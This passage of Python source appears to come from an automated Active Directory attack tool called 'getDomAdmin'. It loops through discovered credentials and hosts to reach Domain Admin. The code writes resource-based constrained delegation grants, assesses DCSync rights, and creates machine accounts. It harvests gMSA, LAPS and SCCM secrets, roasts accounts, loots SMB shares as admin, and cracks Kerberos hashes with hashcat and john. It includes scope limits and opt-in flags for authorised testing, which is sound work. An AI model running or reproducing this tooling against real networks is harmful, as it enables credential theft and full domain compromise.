            or kb.tier_zero_reached or kb.hosts.get(host.target, {}).get("role") != "domain_controller"
            or not kb.visit((cred.key(), record["target_dn"], action["options"]["source"]), "rbcd-write")):
        return
    action["executed"] = True
    result = do_module(kb, session, "rbcd", "computer-rbcd-write", cred.domain, **action["options"])
    items = getattr(result, "results", []) if result is not None else []
    item = items[0] if len(items) == 1 else None
    data = getattr(item, "data", None)
    action["modified"] = bool(getattr(data, "modified", False))
    action["completed"] = bool(getattr(item, "ok", False) and action["modified"]
                               and getattr(data, "completed", False)
                               and getattr(data, "action", None) == "add"
                               and str(getattr(data, "target", "")).casefold() == record["target_name"].casefold()
                               and str(getattr(data, "target_dn", "")).casefold() == record["target_dn"].casefold()
                               and str(getattr(data, "source", "")).casefold() == action["options"]["source"].casefold()
                               and getattr(data, "source_sid", None) in (getattr(data, "after_sids", []) or []))
    action["error"] = getattr(item, "error", None) if item is not None else "No unambiguous module result"
    if action["completed"]:
        kb.rbcd_grant_completed = True
        kb.findings.append(f"RBCD grant readback confirmed: {action['options']['source']} -> {record['target_name']}; ticket and service access unverified")


def ldap_one_rbcd_assessment(kb, host, cred, session, token_data, assumed_sids, root_dn, account):
    """Assess control of one selected, in-scope computer account."""
    result = do_action(kb, session, "query", "computer-rbcd-acl", cred.domain,
                       query=[f"(&(objectClass=computer)(sAMAccountName={escape_filter_chars(account)}))",
                              "objectSid distinguishedName sAMAccountName objectClass dNSHostName"])
    if result is None or not getattr(result, "ok", False):
        return
    query_data = getattr(result, "data", None)
    entries = getattr(query_data, "entries", []) or []
    distinguished_names = getattr(query_data, "distinguished_names", []) or []
    if len(entries) != 1:
        return
    entry = entries[0]
    dn = str(entry.get("distinguishedName") or (distinguished_names[0] if distinguished_names else ""))
    name = str(entry.get("sAMAccountName") or "")
    if (name.casefold() != account.casefold() or not dn or "/" in dn or "\\" in dn
            or not dn.casefold().endswith("," + root_dn.casefold())
            or not kb.visit((cred.key(), dn), "computer-rbcd-acl")):
        return
    target_host = match_rbcd_target(kb, name, entry.get("dNSHostName"))
    record = {"principal": cred.principal(), "source_host": host.target, "target_type": "computer",
              "target_name": name, "target_dn": dn, "target_sid": str(entry.get("objectSid") or ""),
              "target_host": target_host, "decision": "unknown", "reason": "Computer DACL unavailable or incomplete",
              "directory_sids": list(token_data.directory_sids), "assumed_logon_sids": list(assumed_sids),
              "rights": {}, "next_action": None}
    kb.acl_assessments.append(record)
    dacl_result = do_module(kb, session, "daclread", "computer-rbcd-acl", cred.domain,
                            target_dn=dn, ace_type="all")
    items = getattr(dacl_result, "results", []) if dacl_result is not None else []
    item = items[0] if len(items) == 1 else None
    matches = [obj for obj in getattr(getattr(item, "data", None), "objects", []) or []
               if str(obj.get("dn") or "").casefold() == dn.casefold()
               and obj.get("descriptor") and not obj.get("error")]
    if getattr(item, "error", None) or len(matches) != 1:
        return
    token_sids = [*token_data.directory_sids, *assumed_sids]
    for right, mask, guid in (("WriteRBCD", 0x20, "3f78c3e5-f79a-46bd-a0b8-9d18116ddc79"),
                              ("WriteRBCDPropertySet", 0x20, "4c164200-20c0-11d0-a768-00aa006e0529"),
                              ("GenericAll", 0xF01FF, None), ("WriteDacl", 0x40000, None),
                              ("WriteOwner", 0x80000, None)):
        check = assess_dacl(matches[0]["descriptor"], token_sids, mask, object_type=guid,
                            target_sid=matches[0].get("sid"))
        record["rights"][right] = {"decision": check.decision, "reason": check.reason,
                                   "ace_indices": check.ace_indices}
    decisions = {right["decision"] for right in record["rights"].values()}
    record["decision"] = "candidate" if "allowed" in decisions else "unknown" if "unknown" in decisions else "denied"
    record["reason"] = "Conditional DACL assessment; RBCD write, KDC ticket, and service access unverified"
    if record["decision"] == "candidate":
        kb.findings.append(f"conditional RBCD control candidate: {cred.principal()} -> {name}; operation unverified")
    writable = any(record["rights"][right]["decision"] == "allowed" for right in ("WriteRBCD", "WriteRBCDPropertySet", "GenericAll"))
    sources = [machine for machine in kb.machine_account_actions
               if machine.get("completed") and machine.get("stored") and machine.get("credential_ref")
               and machine.get("account") and machine.get("credential_queued")]
    if writable and target_host and len(sources) == 1:
        record["next_action"] = {"module": "rbcd", "options": {"target": name, "target_dn": dn,
                                                               "source": sources[0]["account"], "action": "add"},
                                 "source_credential_ref": sources[0]["credential_ref"],
                                 "executed": False, "modified": False, "completed": False, "error": None}
    execute_rbcd_control(kb, host, cred, session, record)


def ldap_rbcd_assessment(kb, host, cred, session, token_data, assumed_sids, root_dn):
    """Assess explicitly selected or observed allowed computer identities."""
    for account in rbcd_target_accounts(kb):
        if kb.steps >= MAX_STEPS:
            kb.budget_exhausted = True
            return
        ldap_one_rbcd_assessment(kb, host, cred, session, token_data, assumed_sids, root_dn, account)


def ldap_acl_assessment(kb, host, cred, session):
    """Record a conditional DCSync candidate from computed SIDs and root DACL."""
    if not ENABLE_ACL or cred is None or cred.local:
        return
    connection = getattr(session, "connection", None)
    root_dn = str(getattr(connection, "baseDN", "") or "")
    directory_domain = str(getattr(connection, "targetDomain", "") or kb.default_domain)
    if not root_dn or (cred.domain and cred.domain.casefold() != directory_domain.casefold()):
        return
    if not kb.visit((cred.key(), host.target), "domain-root-acl"):
        return
    assessment = {"principal": cred.principal(), "source_host": host.target,
                  "target_type": "domain", "target_dn": root_dn, "decision": "unknown",
                  "reason": "Computed directory groups unavailable",
                  "directory_sids": [], "assumed_logon_sids": ["S-1-1-0", "S-1-5-11", "S-1-5-2"],
                  "rights": {}}
    kb.acl_assessments.append(assessment)
    groups = do_module(kb, session, "token-groups", "domain-root-acl", directory_domain, principal=cred.username)
    group_results = getattr(groups, "results", []) if groups is not None else []
    token = group_results[0] if len(group_results) == 1 else None
    token_data = getattr(token, "data", None)
    if not (getattr(token, "ok", False) and getattr(token_data, "groups_returned", False)
            and getattr(token_data, "directory_sids", None)):
        return
    assessment["directory_sids"] = list(token_data.directory_sids)
    result = do_module(kb, session, "daclread", "domain-root-acl", directory_domain,
                       target_dn=root_dn, ace_type="all")
    dacl_results = getattr(result, "results", []) if result is not None else []
    dacl = dacl_results[0] if len(dacl_results) == 1 else None
    objects = getattr(getattr(dacl, "data", None), "objects", []) or []
    matches = [obj for obj in objects if str(obj.get("dn") or "").casefold() == root_dn.casefold()
               and obj.get("descriptor") and not obj.get("error")]
    if getattr(dacl, "error", None) or len(matches) != 1:
        assessment["reason"] = "Domain-root DACL unavailable or incomplete"
    else:
        descriptor = matches[0]["descriptor"]
        token_sids = [*assessment["directory_sids"], *assessment["assumed_logon_sids"]]
        for right, guid in (("GetChanges", "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"),
                            ("GetChangesAll", "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2")):
            check = assess_dacl(descriptor, token_sids, 0x100, object_type=guid,
                                target_sid=matches[0].get("sid"))
            assessment["rights"][right] = {"decision": check.decision, "reason": check.reason,
                                           "ace_indices": check.ace_indices}
        decisions = {right["decision"] for right in assessment["rights"].values()}
        assessment["decision"] = "candidate" if decisions == {"allowed"} else "denied" if "denied" in decisions else "unknown"
        assessment["reason"] = "Conditional DACL assessment; a directory operation and full Windows token are not verified"
        if assessment["decision"] == "candidate":
            kb.findings.append(f"conditional DCSync candidate: {cred.principal()} on {root_dn}; operation unverified")
    ldap_privileged_group_assessment(kb, host, cred, session, token_data, assessment["assumed_logon_sids"], root_dn)
    ldap_user_reset_assessment(kb, host, cred, session, token_data, assessment["assumed_logon_sids"], root_dn)
    ldap_rbcd_assessment(kb, host, cred, session, token_data, assessment["assumed_logon_sids"], root_dn)


def maybe_create_machine_account(kb, host, cred, session, quota_result):
    """Create at most one opted-in machine identity and queue its DB reference."""
    if (not ENABLE_MACHINE_CREATE or cred is None or cred.local or kb.machine_account_created
            or kb.hosts.get(host.target, {}).get("role") != "domain_controller"):
        return
    items = getattr(quota_result, "results", []) if quota_result is not None else []
    item = items[0] if len(items) == 1 else None
    quota = getattr(getattr(item, "data", None), "quota", None)
    if not (getattr(item, "ok", False) and isinstance(quota, int) and quota > 0):
        return
    record = {"principal": cred.principal(), "source_host": host.target, "quota": quota,
              "account": None, "attempted": False, "completed": False, "stored": False,
              "credential_ref": None, "credential_queued": False, "error": None}
    kb.machine_account_actions.append(record)
    if not kb.visit((cred.key(), kb.default_domain), "machine-create"):
        return
    name = "NXC" + secrets.token_hex(4).upper()
    password = secrets.token_urlsafe(24)
    record["account"] = name + "$"
    record["attempted"] = True
    result = do_module(kb, session, "add-computer", "machine-create", cred.domain,
                       name=name, password=password)
    created = getattr(result, "results", []) if result is not None else []
    created_item = created[0] if len(created) == 1 else None
    data = getattr(created_item, "data", None)
    record["completed"] = bool(getattr(data, "completed", False))
    record["stored"] = bool(getattr(data, "stored", False))
    record["error"] = getattr(created_item, "error", None) if created_item is not None else "No unambiguous module result"
    credential_id = getattr(data, "credential_id", None)
    directory_domain = str(getattr(getattr(session, "connection", None), "domain", "") or cred.domain)
    if not (record["completed"] and record["stored"] and getattr(data, "operation", None) == "add"
            and getattr(data, "account", None) == record["account"]
            and str(getattr(data, "domain", "")).casefold() == directory_domain.casefold()
            and getattr(data, "password", None) == password
            and isinstance(credential_id, int) and credential_id > 0):
        return
    kb.machine_account_created = True
    record["credential_ref"] = {"protocol": "ldap", "id": credential_id}
    record["credential_queued"] = kb.add_cred(Cred(cred.domain, record["account"], "",
                                                  source=f"machine-account:{cred.principal()}",
                                                  db_ref=("ldap", credential_id)))
    kb.findings.append(f"machine account created: {record['account']}; login and privilege unverified")


def ldap_secrets(kb, host, cred, session):
    """Opt-in gMSA, LAPS, SCCM, Kerberos, and ADCS enumeration."""
    domain = kb.default_domain
    if ENABLE_GMSA or ENABLE_DOMAIN_SECRETS:
        harvest_gmsa_result(kb, do_action(kb, session, "gmsa", "gmsa", domain), domain)
    # daclread and shadow-creds need an exact principal target. Do not invoke
    # them without one; targeted calls can be added after principal selection.
    maybe_create_machine_account(kb, host, cred, session,
                                 do_module(kb, session, "maq", "ldap-secrets", domain))
    if ENABLE_SCCM:
        if kb.dns_server in kb.allowed:
            do_module(kb, session, "sccm", "ldap-secrets", domain)
        else:
            kb.log.warn("SCCM skipped: set --dns-server to an exact allowed target")
    if ENABLE_LAPS:
        if kb.dns_server in kb.allowed:
            do_module(kb, session, "laps", "ldap-secrets", domain)
        else:
            kb.log.warn("LAPS skipped: set --dns-server to an exact allowed target")
    if ENABLE_KERBEROS_PROBES and kb.kdc_host in kb.allowed:
        # This module makes Kerberos requests for discovered accounts. Keep it
        # opt-in and use its default pre-created-account filter, never ALL=True.
        do_module(kb, session, "pre2k", "ldap-secrets", domain)
    if ENABLE_ADCS:
        do_module(kb, session, "adcs", "ldap-secrets", domain)


def match_sql_link_target(kb, server_name):
    """Resolve one linked-server name only from live observed allowed identities."""
    name = str(server_name or "").split("\\", 1)[0].split(",", 1)[0].rstrip(".").casefold()
    if not name:
        return None
    matches = [target for target in kb.allowed
               if name == str(target).casefold() or name in kb.observed_hostnames.get(target, set())]
    return matches[0] if len(matches) == 1 else None


def record_mssql_observations(kb, host, cred, result):
    """Keep SQL inventory and permission records separate from access proof."""
    if (result is None or not getattr(result, "ok", False) or result.protocol != "mssql"
            or result.target != host.target or host.target not in kb.allowed):
        return
    data = getattr(result, "data", None)
    observer = cred.principal() if cred else "anonymous"
    records = []
    if result.action == "query":
        for row in result.rows:
            login = str(row.get("login") or "")
            if login:
                admin = row.get("sysadmin")
                records.append({"type": "sqlLogin", "principal": login, "target": host.target,
                                "sysadmin": True if admin in (1, True, "1") else False if admin in (0, False, "0") else None,
                                "source": "mssql_query", "observed_by": observer, "observed_in_run": True})
    elif result.action == "enum_impersonate":
        for permission in getattr(data, "permissions", []) or []:
            grantee = str(permission.get("grantee") or "")
            permission_name = str(permission.get("permission_name") or "")
            state = str(permission.get("state_desc") or "")
            target_login = str(permission.get("target_login") or "")
            if not grantee or not permission_name.casefold().startswith("impersonate"):
                continue
            records.append({"type": "sqlImpersonate" if target_login else "sqlImpersonateAny",
                            "principal": grantee, "target_login": target_login or None,
                            "target": host.target, "permission": permission_name, "state": state,
                            "candidate": state.casefold() in ("grant", "grant_with_grant_option"),
                            "source": "mssql_server_permissions", "observed_by": observer,
                            "observed_in_run": True})
    elif result.action == "enum_links":
        for server in getattr(data, "servers", []) or []:
            name = str(server.get("SRV_NAME") or "")
            if name:
                target_host = match_sql_link_target(kb, name)
                records.append({"type": "sqlLinkedServer", "principal": observer,
                                "target": host.target, "server": name,
                                "target_host": target_host, "in_scope": target_host is not None,
                                "source": "mssql_linkedservers", "observed_in_run": True})
        if getattr(data, "login_mappings_queried", False):
            for mapping in getattr(data, "login_mappings", []) or []:
                server = str(mapping.get("Linked Server") or "")
                if server:
                    target_host = match_sql_link_target(kb, server)
                    records.append({"type": "sqlLinkedLogin", "principal": str(mapping.get("Local Login") or ""),
                                    "target": host.target, "server": server,
                                    "target_host": target_host, "in_scope": target_host is not None,
                                    "remote_login": str(mapping.get("Remote Login") or ""),
                                    "source": "mssql_helplinkedsrvlogin", "observed_by": observer,
                                    "observed_in_run": True})
    added = 0
    for record in records:
        if record not in kb.sql_edges:
            kb.sql_edges.append(record)
            added += 1
    if added:
        kb.findings.append(f"observed {added} {result.action} SQL relationship(s) on {host.target}; no new access verified")


def mssql_sweep(kb, host, cred, session):
    domain = kb.default_domain
    result = do_action(kb, session, "query", "mssql", domain,
                       query="SELECT SUSER_SNAME() AS login, IS_SRVROLEMEMBER('sysadmin') AS sysadmin")
    record_mssql_observations(kb, host, cred, result)
    for mod in ("enum_links", "enum_impersonate", "mssql_priv"):
        result = do_module(kb, session, mod, "mssql", domain)
        if mod in ("enum_links", "enum_impersonate"):
            for item in getattr(result, "results", []) if result is not None else []:
                record_mssql_observations(kb, host, cred, item)
    if ENABLE_SQL_DUMP:
        do_module(kb, session, "mssql_dumper", "mssql", domain)


def verify_domain_admin(kb, cred, target, session):
    """Require a computed Domain Admin SID and verified administrator access on this DC."""
    if not kb.tier_zero_reached or not getattr(session, "authenticated", False):
        return
    target_domain = str(kb.hosts.get(target, {}).get("domain") or "")
    if not target_domain or cred.domain.casefold() != target_domain.casefold():
        return
    if not kb.visit((cred.key(), target), "verify-domain-admin"):
        return
    result = do_module(kb, session, "token-groups", "domain-admin-proof", target_domain,
                       principal=cred.username)
    if result is None or len(getattr(result, "results", [])) != 1:
        return
    token = result.results[0]
    data = getattr(token, "data", None)
    sid = getattr(data, "principal_sid", None)
    if not (getattr(token, "ok", False) and getattr(data, "groups_returned", False)
            and isinstance(sid, str) and "-" in sid):
        return
    domain_admin_sid = sid.rsplit("-", 1)[0] + "-512"
    if domain_admin_sid not in getattr(data, "directory_sids", []):
        return
    if not any(edge["principal"] == cred.principal() and edge["target"] == target
               and edge["role"] == "domain_controller" and edge["admin"] for edge in kb.access_edges):
        return
    kb.da_reached = True
    kb.da_proof = f"{cred.principal()} has computed Domain Admin membership and administrator access on DC {target}"
    kb.log.crit(f"DOMAIN ADMIN VERIFIED: {kb.da_proof}")


def crack_hashes(kb):
    """Crack captured roast/AS-REP hashes -> plaintext -> feed the loop again."""
    wl = kb.tools.get("_wordlist")
    hc = kb.tools.get("hashcat")
    jn = kb.tools.get("john")
    if not kb.roast_files or not wl or not (hc or jn):
        return
    for path in sorted(kb.roast_files):
        if not kb.visit(("crackfile", path), "crack"):
            continue
        if not (os.path.isfile(path) and os.path.getsize(path)):
            continue
        with open(path, encoding="utf-8", errors="replace") as fh:
            sample = fh.read(4000)
        mode = "18200" if "$krb5asrep$" in sample else "13100" if "$krb5tgs$" in sample else None
        if hc and mode:
            pot = path + ".pot"
            run_tool(kb, [hc, "-m", mode, "-a", "0", path, wl, "--potfile-path", pot, "--quiet"],
                     f"hashcat -m {mode}", timeout=TOOL_TIMEOUT)
            rc, out, _ = run_tool(kb, [hc, "-m", mode, path, "--show", "--potfile-path", pot], "hashcat --show")
            _ingest_cracked(kb, out)
        elif jn:
            run_tool(kb, [jn, f"--wordlist={wl}", path], "john crack", timeout=TOOL_TIMEOUT)
            rc, out, _ = run_tool(kb, [jn, "--show", path], "john --show")
            _ingest_cracked(kb, out)


def _ingest_cracked(kb, text):
    """Read hashcat/john show output without guessing the principal from hash bytes."""
    for line in text.splitlines():
        if ":" not in line:
            continue
        hashed, password = line.rsplit(":", 1)
        asrep = re.match(r"^\$krb5asrep\$\d+\$([^@:$]+)(?:@([^:]+))?:", hashed)
        tgs = re.match(r"^\$krb5tgs\$\d+\$\*([^*$]+)\$([^*$]+)\$", hashed)
        match = asrep or tgs
        if match and password and not password.startswith("$"):
            kb.add_cred(Cred(match.group(2) or kb.default_domain, match.group(1), password,
                             "plaintext", source="cracked"))


# --------------------------------------------------------------------------- #
# the decision tree for one (credential, target) state
# --------------------------------------------------------------------------- #
def process_state(kb, root, cred, target):
    """Apply the full decision tree to one (credential, target). Each technique is
    gated by the spanning-tree visit() so it runs once per meaningful scope, but a
    newly-discovered credential creates fresh states that re-enter this tree.
    """
    try:
        host = root if target == root.target else root.at(target)
    except (Exception, SystemExit) as exc:
        kb.log.exception(f"cannot select target {target} (outside --allow-target?)", exc)
        return

    kb.current_state = (cred, target)
    ident = "anon" if cred is None else cred.label()
    kb.log.step(f"STATE: {ident} -> {target}")

    # ---- SMB (always attempted) ----------------------------------------- #
    if (cred is None or cred.protocols is None or "smb" in cred.protocols) and kb.visit((cred.key() if cred else "anon", target), "smb"):
        smb = open_session(kb, host, "smb", cred)
        if smb is not None:
            kb.note_access(cred, target, "smb", smb)
            is_admin = bool(getattr(smb, "admin", False))
            is_dc = bool(kb.hosts.get(target, {}).get("dc"))
            if kb.visit((cred.key() if cred else "anon", target), "smb-enum"):
                smb_enumerate(kb, host, cred, smb)
            if is_admin and kb.visit((cred.key() if cred else "anon", target), "smb-loot"):
                smb_loot_admin(kb, host, cred, smb)
            if is_dc and (is_admin or (cred and not cred.local)) and kb.visit((cred.key() if cred else "anon", target), "ntds"):
                smb_dcsync(kb, host, cred, smb)
            sync_db(kb, smb, "smb", target=host.target)

    if kb.steps >= MAX_STEPS:
        kb.budget_exhausted = True
        return

    # ---- LDAP (domain-wide; run once per credential, preferably at a DC) - #
    want_ldap = kb.hosts.get(target, {}).get("dc") or target == root.target
    if (cred is not None and (cred.protocols is None or "ldap" in cred.protocols) and want_ldap
            and kb.visit((cred.key(), kb.default_domain or target), "ldap")):
        ldap = open_session(kb, host, "ldap", cred)
        if ldap is not None:
            kb.note_access(cred, target, "ldap", ldap)
            ldap_enumerate(kb, host, cred, ldap)
            ldap_host_roles(kb, ldap)
            ldap_roast(kb, host, cred, ldap)
            ldap_delegation(kb, host, cred, ldap)
            ldap_secrets(kb, host, cred, ldap)
            ldap_acl_assessment(kb, host, cred, ldap)
            if kb.hosts.get(target, {}).get("dc"):
                verify_domain_admin(kb, cred, target, ldap)
            sync_db(kb, ldap, "ldap", target=host.target)
        if kb.steps >= MAX_STEPS:
            kb.budget_exhausted = True
            return

    # anonymous LDAP (null bind) once per target as well
    if cred is None and want_ldap and kb.visit(("anon", target), "ldap-anon"):
        ldap = open_session(kb, host, "ldap", None)
        if ldap is not None:
            ldap_enumerate(kb, host, cred, ldap)
            ldap_secrets(kb, host, cred, ldap)
            sync_db(kb, ldap, "ldap", target=host.target)

    if kb.steps >= MAX_STEPS:
        kb.budget_exhausted = True
        return

    # ---- MSSQL (credentialed) ------------------------------------------- #
    if (cred is not None and (cred.protocols is None or "mssql" in cred.protocols)
            and kb.visit((cred.key(), target), "mssql")):
        sql = open_session(kb, host, "mssql", cred)
        if sql is not None:
            kb.note_access(cred, target, "mssql", sql)
            mssql_sweep(kb, host, cred, sql)
            sync_db(kb, sql, "mssql", target=host.target)

    # ---- crack whatever we have captured so far (feeds new plaintext) ---- #
    crack_hashes(kb)


# --------------------------------------------------------------------------- #
# seeding and host discovery
# --------------------------------------------------------------------------- #
def seed_credentials(kb, root):
    """Read the credential the playbook was launched with off a live session, so
    the seed is a first-class node that can be reused against every allowed host.
    """
    for proto in ("smb", "ldap"):
        if kb.steps >= MAX_STEPS:
            kb.budget_exhausted = True
            kb.log.warn("step budget reached before seed authentication")
            return
        kb.steps += 1
        session, _timed = run_bounded(lambda proto=proto: getattr(root, proto)(), PROBE_TIMEOUT, kb.log, f"seed {proto} session")
        if session is None:
            continue
        conn = getattr(session, "connection", None)
        if conn is None or not getattr(session, "ok", False):
            continue
        user = getattr(conn, "username", "") or ""
        if not user:
            kb.log.info(f"{proto}: no seed credential (anonymous start)")
            continue
        domain = getattr(conn, "domain", "") or kb.default_domain
        pw = getattr(conn, "password", "") or ""
        nthash = getattr(conn, "nthash", "") or ""
        if pw:
            kb.add_cred(Cred(domain, user, pw, "plaintext", source="seed"))
        elif nthash:
            kb.add_cred(Cred(domain, user, f":{nthash}", "hash", source="seed"))
        sync_db(kb, session, proto, target=root.target)
        return
    kb.log.warn("no usable seed credential — starting fully unauthenticated (null/anon)")


def discover_hosts(kb, root):
    """Expand --allow-target into the concrete host set we may traverse."""
    scope = list(getattr(root.workflow, "allowed_targets", []) or [root.target])
    for target in scope:
        kb.allowed.add(target)
        kb.add_host(target)
    for label, endpoint in (("DNS server", kb.dns_server), ("KDC", kb.kdc_host)):
        if endpoint:
            try:
                ip_address(endpoint)
            except ValueError as exc:
                raise ValueError(f"{label} must be a literal IP address to avoid system DNS resolution") from exc
    for label, endpoint in (("DNS server", kb.dns_server), ("KDC", kb.kdc_host)):
        if endpoint and endpoint not in kb.allowed:
            raise ValueError(f"{label} {endpoint!r} is outside the explicit target list")
    defaults = getattr(root, "connection_defaults", None) or {}
    if (defaults.get("kerberos") or defaults.get("use_kcache")) and kb.kdc_host not in kb.allowed:
        raise ValueError("Kerberos authentication requires --kdcHost to exactly match an allowed target")
    if not kb.dns_server:
        raise ValueError("--dns-server must exactly match an allowed target to prevent use of the system resolver")
    kb.log.info(f"allowed traversal scope ({len(kb.allowed)} host(s)): {', '.join(sorted(kb.allowed))}")


# --------------------------------------------------------------------------- #
# reporting
# --------------------------------------------------------------------------- #
def build_report(kb, target):
    creds = [{"identity": c.label(), "kind": c.kind, "local": c.local, "source": c.source,
              "target_scope": c.target_scope, "protocols": c.protocols, "expires_at": c.expires_at,
              "credential_ref": {"protocol": c.db_ref[0], "id": c.db_ref[1]} if c.db_ref else None}
             for c in kb.creds.values()]
    hosts = [{"host": h, **facts} for h, facts in kb.hosts.items()]
    edges = [edge for edge in kb.access_edges if edge["admin"]]
    relationships = [{**edge, "verified_in_run": (
        any(access["principal"].casefold() == (edge["principal"] or "").casefold()
            and access["target"] == edge["target"] and access["protocol"] == "smb" and access["admin"]
            for access in kb.access_edges) if edge["type"] == "adminTo" else None)}
        for edge in kb.relationship_edges]
    traversal = []
    for (credential_key, host), parent in kb.state_parents.items():
        credential = kb.creds.get(credential_key)
        predecessor = kb.creds.get(parent[0]) if parent else None
        traversal.append({"principal": credential.principal() if credential else "anonymous",
                          "host": host, "role": kb.hosts.get(host, {}).get("role", "unknown"),
                          "from_principal": predecessor.principal() if predecessor else None,
                          "from_host": parent[1] if parent else None})
    return DAReport(
        target=target, da_reached=kb.da_reached, da_proof=kb.da_proof,
        tier_zero_reached=kb.tier_zero_reached, tier_zero_proof=kb.tier_zero_proof,
        tier_zero_path=kb.tier_zero_path, tier_zero_material=kb.tier_zero_material,
        access_edges=kb.access_edges, relationship_edges=relationships,
        acl_assessments=kb.acl_assessments, machine_account_actions=kb.machine_account_actions,
        traversal_tree=traversal,
        delegation_edges=kb.delegation_edges, delegation_tickets=kb.delegation_tickets,
        sql_edges=kb.sql_edges,
        credentials=creds, hosts=hosts, admin_edges=edges, findings=kb.findings,
        steps=kb.steps, log_file=kb.log.base + ".log", termination=kb.termination,
        pending_states=len(kb.worklist),
    )


def print_summary(kb, target):
    out = ["", "=" * 78, f" getDomAdmin — {target}", "=" * 78,
           f" Tier Zero reached    : {'YES — ' + kb.tier_zero_proof if kb.tier_zero_reached else 'not proven'}",
           f" Domain compromise    : {'YES — ' + kb.da_proof if kb.da_reached else 'not proven'}",
           f" Traversal ended       : {kb.termination}",
           f" credentials harvested: {len(kb.creds)}",
           f" hosts in scope       : {len(kb.allowed)}",
           f" hosts recorded       : {len(kb.hosts)}",
           f" technique executions : {kb.steps}",
           f" captured hash files  : {len(kb.roast_files)}",
           f" delegation edges     : {len(kb.delegation_edges)}",
           f" delegated tickets    : {len(kb.delegation_tickets)}",
           f" SQL relation edges   : {len(kb.sql_edges)}",
           f" full log             : {kb.log.base}.log",
           "-" * 78, " CREDENTIALS:"]
    out.extend(f"   - {c.label():<48} via {c.source}" for c in kb.creds.values())
    if kb.findings:
        out.append(" NOTABLE FINDINGS / EDGES:")
        out.extend(f"   - {f}" for f in kb.findings[:60])
        if len(kb.findings) > 60:
            out.append(f"   … (+{len(kb.findings) - 60} more in the log)")
    out.append("=" * 78)
    print("\n".join(out))


# --------------------------------------------------------------------------- #
# entry point — the fixpoint loop
# --------------------------------------------------------------------------- #
def run(host):
    host.defaults(stop_on_error=False)
    log = Log(host.target)
    kb = KB(log=log, default_domain=_resolve_domain(host), dns_server=_resolve_dns(host),
            kdc_host=_resolve_kdc(host), seed_target=host.target)
    log.step(f"getDomAdmin start — seed target {host.target}, domain '{kb.default_domain or '?'}', dns '{kb.dns_server or '?'}'")
    log.info(f"budgets: max_steps={MAX_STEPS} max_rounds={MAX_ROUNDS} probe_timeout={PROBE_TIMEOUT}s "
                 f"stop_on_da={STOP_ON_DA} stop_on_tier_zero={STOP_ON_TIER_ZERO} "
                 f"delegation_tickets={ENABLE_DELEGATION_TICKETS} adcs={ENABLE_ADCS} laps={ENABLE_LAPS} "
             f"gmsa={ENABLE_GMSA} group_writes={ENABLE_GROUP_WRITES} password_reset={ENABLE_PASSWORD_RESET} "
             f"machine_create={ENABLE_MACHINE_CREATE} rbcd_target={RBCD_TARGET_ACCOUNT or '-'} rbcd_write={ENABLE_RBCD_WRITE} "
             f"reset_target={RESET_TARGET_USER or '-'} domain_secrets={ENABLE_DOMAIN_SECRETS} "
             f"sccm={ENABLE_SCCM} loot={ENABLE_LOOT}")

    try:
        preflight_tools(kb)
        discover_hosts(kb, host)
        snapshot_workspace_credentials(kb)
        seed_credentials(kb, host)

        # always probe every allowed host anonymously first (null/guest reach-map)
        for target in sorted(kb.allowed):
            kb.enqueue(None, target)

        rounds = 0
        while kb.worklist and kb.steps < MAX_STEPS and rounds < MAX_ROUNDS:
            rounds += 1
            batch = sorted(kb.worklist, key=kb.state_priority)
            kb.worklist = []
            log.step(f"==== fixpoint round {rounds}: {len(batch)} state(s) queued, "
                     f"{len(kb.creds)} creds known, {kb.steps} steps so far ====")
            budget_stopped = False
            for index, (cred, target) in enumerate(batch):
                if kb.steps >= MAX_STEPS:
                    log.warn("step budget reached — stopping traversal")
                    kb.worklist.extend(batch[index:])
                    budget_stopped = True
                    break
                process_state(kb, host, cred, target)
                if kb.tier_zero_reached and STOP_ON_TIER_ZERO:
                    log.crit("Tier Zero access verified and GETDA_STOP_ON_TIER_ZERO=1 — stopping early")
                    kb.worklist = []
                    break
                if kb.da_reached and STOP_ON_DA:
                    log.crit("Domain Admin proven and GETDA_STOP_ON_DA=1 — stopping early")
                    kb.worklist = []
                    break
            # one more crack pass per round in case new hashes arrived mid-round
            kb.current_state = None
            if not (kb.tier_zero_reached and STOP_ON_TIER_ZERO):
                issue_delegation_tickets(kb, host)
            crack_hashes(kb)
            if budget_stopped:
                break

        if kb.tier_zero_reached and STOP_ON_TIER_ZERO:
            kb.termination = "stopped_on_tier_zero"
        elif kb.da_reached and STOP_ON_DA:
            kb.termination = "stopped_on_proof"
        elif kb.budget_exhausted or (kb.steps >= MAX_STEPS and kb.worklist):
            kb.termination = "budget_exhausted"
            log.warn(f"step budget reached with {len(kb.worklist)} state(s) still queued")
        elif not kb.worklist:
            kb.termination = "saturated"
            log.good(f"fixpoint reached (saturation) after {rounds} round(s): no new state to explore")
        else:
            kb.termination = "budget_exhausted"
            log.warn(f"stopped on budget after {rounds} round(s) with {len(kb.worklist)} state(s) still queued")
    except (Exception, SystemExit) as exc:
        kb.termination = "failed"
        kb.log.exception("fatal error in getDomAdmin main loop", exc)
    finally:
        print_summary(kb, host.target)
        report = build_report(kb, host.target)
        log.step(f"done — {len(kb.creds)} credential(s), tier_zero={'yes' if kb.tier_zero_reached else 'no'}, "
                 f"DA={'yes' if kb.da_reached else 'no'}; log at {kb.log.base}.log")
        log.close()

    return host.finding("getDomAdmin", ok=kb.tier_zero_reached, data=report,
                        inputs={"domain": kb.default_domain, "hosts": sorted(kb.allowed),
                                "credentials": len(kb.creds), "tier_zero_reached": kb.tier_zero_reached,
                                "da_reached": kb.da_reached,
                                "termination": kb.termination})


def _resolve_domain(host):
    return (host.connection_defaults.get("domain") or "") if getattr(host, "connection_defaults", None) else ""


def _resolve_dns(host):
    return (host.connection_defaults.get("dns_server") or "") if getattr(host, "connection_defaults", None) else ""


def _resolve_kdc(host):
    return (host.connection_defaults.get("kdcHost") or "") if getattr(host, "connection_defaults", None) else ""
